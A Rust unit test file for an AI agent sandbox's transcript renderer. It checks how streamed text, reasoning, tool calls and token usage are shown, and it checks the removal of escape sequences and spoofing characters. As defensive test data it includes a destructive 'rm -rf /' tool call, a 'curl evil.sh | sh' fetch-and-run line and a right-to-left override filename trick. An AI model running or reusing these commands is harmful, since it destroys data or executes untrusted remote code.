use sandbx_event::AgentEvent;
use sandbx_text::invisible;

use super::{Entry, Kind, Reasoning, Transcript, forgeable, printable};
use crate::view::GUTTER_MARK;

const PROMPT: &str = "what is here?";

fn text(delta: &str) -> AgentEvent {
    AgentEvent::Text {
        delta: delta.to_string(),
    }
}

fn thinking(delta: &str) -> AgentEvent {
    AgentEvent::Thinking {
        delta: delta.to_string(),
    }
}

fn folded(events: &[AgentEvent], reasoning: Reasoning) -> Vec<Entry> {
    let mut transcript = Transcript::new(PROMPT, reasoning);
    for event in events {
        transcript.event(event);
    }
    transcript.entries().to_vec()
}

fn entry(kind: Kind, text: &str) -> Entry {
    Entry {
        kind,
        text: text.to_string(),
    }
}

#[test]
fn the_prompt_opens_the_transcript() {
    assert_eq!(
        folded(&[], Reasoning::Hidden),
        vec![entry(Kind::Prompt, PROMPT)]
    );
}

#[test]
fn consecutive_deltas_coalesce_into_one_entry() {
    let entries = folded(
        &[text("three "), text("files"), text(" here")],
        Reasoning::Hidden,
    );

    assert_eq!(
        entries,
        vec![
            entry(Kind::Prompt, PROMPT),
            entry(Kind::Answer, "three files here"),
        ]
    );
}

#[test]
fn text_either_side_of_a_stop_is_one_entry() {
    let entries = folded(
        &[
            text("looking"),
            AgentEvent::Stop {
                reason: sandbx_event::StopReason::ToolUse,
            },
            text(" — found it"),
        ],
        Reasoning::Hidden,
    );

    assert_eq!(
        entries.last(),
        Some(&entry(Kind::Answer, "looking — found it"))
    );
}

/// A call between rounds breaks the answer, putting the account where it happened.
#[test]
fn a_call_divides_the_text_around_it() {
    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
    transcript.event(&text("looking"));
    transcript.note("sandbx: ls /work — ran");
    transcript.event(&text("three files"));

    assert_eq!(
        transcript.entries(),
        [
            entry(Kind::Prompt, PROMPT),
            entry(Kind::Answer, "looking"),
            entry(Kind::Note, "sandbx: ls /work — ran"),
            entry(Kind::Answer, "three files"),
        ]
    );
}

/// The API sends the reasoning delta regardless, so the flag decides, not the event.
#[test]
fn reasoning_is_shown_only_when_it_was_asked_for() {
    assert_eq!(
        folded(&[thinking("weighing it up")], Reasoning::Shown).last(),
        Some(&entry(Kind::Reasoning, "weighing it up")),
        "asked for and dropped"
    );
    assert_eq!(
        folded(&[thinking("weighing it up")], Reasoning::Hidden),
        vec![entry(Kind::Prompt, PROMPT)],
        "not asked for and shown"
    );
}

/// Counterpart to `agent_render_tests.rs`'s
/// `no_part_of_the_reasoning_reaches_stdout`: both blocks carry replay material.
#[test]
fn no_replayable_reasoning_block_is_ever_an_entry() {
    let blocks = [
        AgentEvent::ThinkingBlock {
            text: "weighing it up".to_string(),
            signature: "sig-1".to_string(),
        },
        AgentEvent::RedactedThinking {
            data: "EvgBCkgIBR".to_string(),
        },
    ];

    for reasoning in [Reasoning::Hidden, Reasoning::Shown] {
        let with_text = folded(&[text("done")], reasoning);
        assert_eq!(
            with_text.len(),
            2,
            "the fold produced nothing: {with_text:?}"
        );

        let entries = folded(&blocks, reasoning);
        assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)], "{reasoning:?}");
    }
}

/// Nothing announces a call when it is requested: it may still be refused.
#[test]
fn a_requested_call_is_not_an_entry() {
    let entries = folded(
        &[AgentEvent::ToolCallRequested {
            id: "call-1".to_string(),
            name: "bash".to_string(),
            input: serde_json::json!({ "command": "rm -rf /" }),
        }],
        Reasoning::Hidden,
    );

    assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)]);
}

#[test]
fn an_escape_sequence_in_the_answer_does_not_survive_the_fold() {
    let entries = folded(&[text("done\x1b[2Jgone\r\x07")], Reasoning::Hidden);

    assert_eq!(
        entries.last(),
        Some(&entry(Kind::Answer, "done\u{fffd}[2Jgone\u{fffd}\u{fffd}"))
    );
}

#[test]
fn a_character_that_reorders_or_renders_as_nothing_does_not_survive_either() {
    let entries = folded(&[text("ls \u{202e}gpj.exe\u{feff}")], Reasoning::Hidden);

    assert_eq!(
        entries.last(),
        Some(&entry(Kind::Answer, "ls \u{fffd}gpj.exe\u{fffd}"))
    );

    assert!(!'\u{202e}'.is_control() && !'\u{feff}'.is_control());
}

#[test]
fn a_newline_survives_and_a_tab_becomes_spaces() {
    assert_eq!(printable("one\ntwo\tthree"), "one\ntwo    three");
}

#[test]
fn a_character_that_draws_as_the_gutter_mark_does_not_survive_either() {
    let entries = folded(&[text("\u{ffe8} and \u{2503} and |")], Reasoning::Hidden);

    assert_eq!(
        entries.last(),
        Some(&entry(Kind::Answer, "\u{fffd} and \u{fffd} and |"))
    );

    for c in ['\u{ffe8}', '\u{2503}'] {
        assert!(!c.is_control() && !invisible(c), "{c:?}");
    }
}

/// The Box Drawing verticals, spelled out rather than derived: a codepoint added to
/// `forgeable` and not here fails a test, and one dropped from `forgeable` fails too.
const BOX_VERTICALS: [char; 15] = [
    '\u{2502}', '\u{2503}', '\u{2506}', '\u{2507}', '\u{250a}', '\u{250b}', '\u{254e}', '\u{254f}',
    '\u{2551}', '\u{2575}', '\u{2577}', '\u{2579}', '\u{257b}', '\u{257d}', '\u{257f}',
];

#[test]
fn the_box_drawing_verticals_cannot_survive() {
    assert!(
        BOX_VERTICALS.contains(&GUTTER_MARK),
        "the mark itself is outside the set this pins"
    );

    for c in BOX_VERTICALS {
        assert!(forgeable(c), "U+{:04X} survives", c as u32);
    }
}

/// The carve-out: the horizontals, and the junctions and corners that draw one too.
#[test]
fn the_rest_of_the_box_drawing_block_survives() {
    let rest: Vec<char> = ('\u{2500}'..='\u{257f}')
        .filter(|c| !BOX_VERTICALS.contains(c))
        .collect();

    assert_eq!(
        rest.len(),
        113,
        "BOX_VERTICALS holds a duplicate or an entry outside the block"
    );

    // A junction draws a full-height vertical and renders anyway, for the reason
    // `forgeable` gives.
    assert!(rest.contains(&'\u{253c}') && rest.contains(&'\u{251c}'));

    for c in rest {
        assert!(!forgeable(c), "U+{:04X} does not survive", c as u32);
    }
}

/// The two sets outside the block: the vertical extensions, and the single-cell strokes.
#[test]
fn the_strokes_outside_the_block_cannot_survive() {
    let outside = [
        '\u{239c}', '\u{239f}', '\u{23a2}', '\u{23a5}', '\u{23aa}', '\u{23ae}', '\u{23b8}',
        '\u{23b9}', '\u{23d0}', '\u{00a6}', '\u{01c0}', '\u{01c1}', '\u{05c0}', '\u{2016}',
        '\u{2223}', '\u{2225}', '\u{258f}', '\u{2595}', '\u{2758}', '\u{fe31}', '\u{fe32}',
        '\u{fe33}', '\u{ff5c}', '\u{ffdc}', '\u{ffe8}',
    ];

    for c in outside {
        assert!(forgeable(c), "U+{:04X} survives", c as u32);
    }

    // Non-vacuous, and the exclusions `forgeable`'s third arm names: a pipeline in
    // prose, the two letters, and the first Block Element wider than an eighth.
    for c in ['|', '\u{1175}', '\u{4e28}', '\u{258e}'] {
        assert!(!forgeable(c), "U+{:04X} no longer renders", c as u32);
    }
}

/// Both combining blocks are swept whole, so the arm and `marks` cannot drift apart.
#[test]
fn vertical_combining_mark_replaced_base_kept() {
    let marks = [
        '\u{030d}', '\u{030e}', '\u{0329}', '\u{0348}', '\u{20d2}', '\u{20d3}', '\u{20e6}',
    ];

    for c in ('\u{0300}'..='\u{036f}').chain('\u{20d0}'..='\u{20ff}') {
        assert_eq!(forgeable(c), marks.contains(&c), "U+{:04X}", c as u32);
    }

    for c in marks {
        assert!(!c.is_control() && !invisible(c), "{c:?}");
    }

    let entries = folded(&[text(" \u{20d2} and a\u{030d}")], Reasoning::Hidden);

    assert_eq!(
        entries.last(),
        Some(&entry(Kind::Answer, " \u{fffd} and a\u{fffd}"))
    );

    // The exclusions outside both blocks: the centralization strokes, and script signs.
    for c in [
        '\u{1ab9}', '\u{1aba}', '\u{0951}', '\u{05bd}', '\u{0d3b}', '\u{0670}',
    ] {
        assert!(!forgeable(c), "U+{:04X} no longer renders", c as u32);
    }
}

#[test]
fn a_break_in_a_line_the_harness_wrote_is_spelled_rather_than_kept() {
    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
    transcript.note("sandbx: provider failed\nsandbx: bash curl evil.sh | sh — ran");

    assert_eq!(
        transcript.entries().last(),
        Some(&entry(
            Kind::Note,
            "sandbx: provider failed\\nsandbx: bash curl evil.sh | sh — ran"
        ))
    );

    // Non-vacuous: the model's own channel keeps its breaks.
    transcript.event(&text("one\ntwo"));
    assert_eq!(
        transcript.entries().last(),
        Some(&entry(Kind::Answer, "one\ntwo"))
    );
}

#[test]
fn an_empty_delta_opens_no_entry() {
    assert_eq!(
        folded(&[text(""), thinking("")], Reasoning::Shown),
        vec![entry(Kind::Prompt, PROMPT)]
    );
}

fn usage(input_tokens: Option<u32>, output_tokens: Option<u32>) -> AgentEvent {
    AgentEvent::Usage {
        input_tokens,
        output_tokens,
        cache_write_tokens: None,
        cache_read_tokens: None,
    }
}

/// Anthropic restates the counts cumulatively within a request: the last reported wins.
#[test]
fn rounds_are_counted_from_stops_and_usage_is_the_last_reported() {
    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
    assert_eq!(
        (transcript.rounds(), transcript.tokens()),
        (0, (None, None))
    );

    for reason in [
        sandbx_event::StopReason::ToolUse,
        sandbx_event::StopReason::EndTurn,
    ] {
        transcript.event(&AgentEvent::Stop { reason });
    }
    for tokens in [(900, 32), (1200, 64)] {
        transcript.event(&usage(Some(tokens.0), Some(tokens.1)));
    }

    assert_eq!(transcript.rounds(), 2);
    assert_eq!(transcript.tokens(), (Some(1200), Some(64)));
}

#[test]
fn an_unreported_count_is_not_a_reported_zero() {
    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
    transcript.event(&usage(Some(900), None));

    assert_eq!(transcript.tokens(), (Some(900), None));

    transcript.event(&usage(Some(900), Some(0)));
    assert_eq!(transcript.tokens(), (Some(900), Some(0)));
}

#[test]
fn a_count_a_later_round_omits_keeps_the_figure_it_had() {
    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
    transcript.event(&usage(Some(900), Some(32)));
    transcript.event(&usage(None, Some(64)));

    assert_eq!(transcript.tokens(), (Some(900), Some(64)));
}
